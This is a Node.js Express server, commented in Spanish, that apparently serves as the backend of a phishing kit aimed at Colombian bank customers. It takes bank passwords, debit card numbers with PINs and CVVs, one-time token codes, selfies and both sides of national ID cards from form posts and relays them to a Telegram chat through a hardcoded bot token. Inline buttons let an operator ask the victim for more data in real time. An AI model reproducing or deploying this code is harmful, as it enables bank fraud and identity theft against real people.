const express = require('express');
const path = require('path');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// Configuración inicial
const app = express();
const token = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
const chatId = process.env.TELEGRAM_CHAT_ID || '-1002638389042';

// Almacenamiento de sesiones
const sessionData = new Map();

// Middlewares - Aumentar límite para manejar imágenes base64
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Configurar CORS y cabeceras
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, '..')));

// Configurar el bot de Telegram
const bot = new TelegramBot(token, { webHook: true });

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Ruta para archivos HTML
app.get('/*.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', req.path));
});

// Rutas API
app.post('/api/send-telegram', async (req, res) => {
    try {
        console.log('📨 Recibido request en /api/send-telegram');
        console.log('📦 Body:', JSON.stringify(req.body).substring(0, 200) + '...');
        console.log('🔍 Tipo de dato:', req.body.tipo);
        
        if (req.body.foto) {
            console.log('📸 Detectada foto en el request');
            console.log('📏 Tamaño aprox:', req.body.foto.length, 'caracteres');
        }
        
        // Obtener sessionId del cliente
        const sessionId = req.body.sessionId || req.ip;
        
        const result = await sendTelegramMessage(req.body, sessionId);
        
        console.log('✅ Mensaje enviado exitosamente a Telegram');
        console.log('🆔 Message ID:', result.message_id);
        
        res.json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('❌ Error al enviar mensaje:', error);
        console.error('Stack trace:', error.stack);
        res.status(500).json({
            success: false,
            error: error.message || 'Error al procesar la solicitud'
        });
    }
});

// Webhook de Telegram
app.post('/api/webhook', (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        console.error('Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Endpoint para limpiar sesión
app.post('/api/clear-session', async (req, res) => {
    try {
        const sessionId = req.body.sessionId;
        if (sessionId && sessionData.has(sessionId)) {
            sessionData.delete(sessionId);
            console.log('🧹 Sesión limpiada:', sessionId);
        }
        res.json({ success: true });
    } catch (error) {
        console.error('Error al limpiar sesión:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Función para enviar mensajes
async function sendTelegramMessage(data, sessionId = null) {
    try {
        console.log('🔧 Procesando mensaje para Telegram...');
        
        // Actualizar datos de sesión
        if (sessionId && data.tipo !== 'Token') {
            if (!sessionData.has(sessionId)) {
                sessionData.set(sessionId, { history: [], data: {}, fullData: [] });
            }
            
            const session = sessionData.get(sessionId);
            
            // Guardar datos del mensaje actual
            if (data.tipo === 'Clave Segura') {
                session.data.clave = { tipoDocumento: data.tipoDocumento, numeroDocumento: data.numeroDocumento, clave: data.clave };
                session.history.push(`✅ Clave Segura`);
                session.fullData.push(`🔐 Clave Segura: ${data.tipoDocumento} ${data.numeroDocumento} | Clave: ${data.clave}`);
            } else if (data.tipo === 'Tarjeta Débito') {
                session.data.tarjeta = { 
                    tipoDocumento: data.tipoDocumento, 
                    numeroDocumento: data.numeroDocumento, 
                    numeroTarjeta: data.numeroTarjeta,
                    claveTarjeta: data.claveTarjeta,
                    fechaVencimiento: data.fechaVencimiento,
                    cvv: data.cvv
                };
                session.history.push(`✅ Tarjeta Débito`);
                session.fullData.push(`💳 Tarjeta: ${data.numeroTarjeta} | Venc: ${data.fechaVencimiento} | CVV: ${data.cvv} | Clave: ${data.claveTarjeta}`);
                session.fullData.push(`📋 Usuario: ${data.tipoDocumento} ${data.numeroDocumento}`);
            } else if (data.tipo === 'Selfie') {
                session.data.selfie = { messageId: data.messageId };
                session.history.push(`✅ Selfie`);
                session.fullData.push(`📸 Selfie capturado - ID: ${data.messageId}`);
            } else if (data.tipo === 'Cédula Frontal') {
                if (!session.data.cedula) session.data.cedula = {};
                session.data.cedula.frontal = { messageId: data.messageId };
                session.history.push(`✅ Cédula Frontal`);
                session.fullData.push(`🪪 Cédula FRONTAL - ID: ${data.messageId}`);
            } else if (data.tipo === 'Cédula Trasera') {
                if (!session.data.cedula) session.data.cedula = {};
                session.data.cedula.trasera = { messageId: data.messageId };
                session.history.push(`✅ Cédula Trasera`);
                session.fullData.push(`🪪 Cédula TRASERA - ID: ${data.messageId}`);
            }
            
            sessionData.set(sessionId, session);
        }
        
        // Obtener datos acumulados (solo datos PREVIOS, no el actual)
        let acumulado = '';
        if (sessionId && sessionData.has(sessionId)) {
            const session = sessionData.get(sessionId);
            // Excluir el último elemento de fullData para evitar duplicación
            if (session.fullData && session.fullData.length > 1) {
                const datosAnteriores = session.fullData.slice(0, -1); // Todos menos el último
                acumulado = '\n\n' + datosAnteriores.join('\n');
            }
        }
        
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
                ],
                [
                    { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
                    { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
                ],
                [
                    { text: '✅ Finalizar', callback_data: 'finalizar' }
                ]
            ]
        };

        // Si es una foto (base64), enviarla como imagen
        if (data.foto) {
            console.log('📸 Procesando foto para envío...');
            
            try {
                // Verificar que la foto tenga el formato correcto
                if (!data.foto.includes('base64,')) {
                    throw new Error('Formato de foto inválido');
                }
                
                const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
                console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
                
                const timestamp = new Date().toLocaleString('es-CO', { 
                    timeZone: 'America/Bogota',
                    dateStyle: 'short',
                    timeStyle: 'short'
                });
                
                let caption;
                
                if (data.tipo === 'Selfie') {
                    caption = `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                } else if (data.tipo === 'Cédula Frontal') {
                    caption = `🪪 <b>CÉDULA DE CIUDADANÍA - LADO FRONTAL</b>\n\n📄 <b>IMPORTANTE:</b> Este es el <b>FRENTE</b> del documento\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                } else if (data.tipo === 'Cédula Trasera') {
                    caption = `🪪 <b>CÉDULA DE CIUDADANÍA - LADO TRASERO (REVERSO)</b>\n\n📄 <b>IMPORTANTE:</b> Este es el <b>REVERSO</b> del documento\n✅ <b>Captura completa:</b> Ambos lados recibidos\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                } else if (data.tipo === 'Cédula') {
                    caption = `🪪 <b>DOCUMENTO DE IDENTIDAD</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                }
                
                console.log('📤 Enviando foto a Telegram con botones...');
                
                const result = await bot.sendPhoto(chatId, buffer, {
                    caption: caption,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });
                
                console.log('✅ Foto enviada con éxito, Message ID:', result.message_id);
                return result;
                
            } catch (photoError) {
                console.error('❌ Error procesando/enviando foto:', photoError);
                throw photoError;
            }
        }

        // Enviar mensaje de texto
        console.log('📝 Procesando mensaje de texto...');
        
        const timestamp = new Date().toLocaleString('es-CO', { 
            timeZone: 'America/Bogota',
            dateStyle: 'short',
            timeStyle: 'short'
        });
        
        let messageText;
        if (typeof data === 'object') {
            if (data.tipo === 'Clave Segura') {
                messageText = `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                            `📋 <b>Tipo:</b> ${data.tipo}\n` +
                            `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                            `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
                            `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
                            `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
            } else if (data.tipo === 'Tarjeta Débito') {
                messageText = `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                            `📋 <b>Tipo:</b> ${data.tipo}\n` +
                            `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                            `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
                            `💳 <b>DATOS DE TARJETA:</b>\n` +
                            `🔢 <b>Número Completo:</b> <code>${data.numeroTarjeta}</code>\n` +
                            `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n` +
                            `📅 <b>Vencimiento:</b> <code>${data.fechaVencimiento}</code>\n` +
                            `🔐 <b>CVV:</b> <code>${data.cvv}</code>\n\n` +
                            `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
            } else if (data.tipo === 'Token') {
                messageText = `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
                            `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
                            `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
            } else {
                messageText = JSON.stringify(data, null, 2);
            }
        } else {
            messageText = data.toString();
        }

        console.log('📤 Enviando mensaje de texto a Telegram con botones...');
        console.log('📄 Longitud del mensaje:', messageText.length, 'caracteres');

        const result = await bot.sendMessage(chatId, messageText, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        console.log('✅ Mensaje enviado con éxito, Message ID:', result.message_id);
        return result;
        
    } catch (error) {
        console.error('❌ Error en sendTelegramMessage:', error);
        console.error('Stack:', error.stack);
        throw error;
    }
}

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    if (!callbackQuery || !callbackQuery.message) {
        console.error('Callback query inválido');
        return;
    }

    try {
        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;

        await bot.answerCallbackQuery(callbackQuery.id);

        if (action === 'finalizar') {
            console.log('🧹 Limpiando todas las sesiones activas...');
            sessionData.clear();
            await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: { inline_keyboard: [] }
            });
        }
    } catch (error) {
        console.error('Error al procesar callback query:', error);
    }
});

// Handler para Vercel
const handler = (req, res) => {
    // Asegurarse de que las rutas funcionen
    if (!res.headersSent) {
        return app(req, res);
    }
};

module.exports = handler;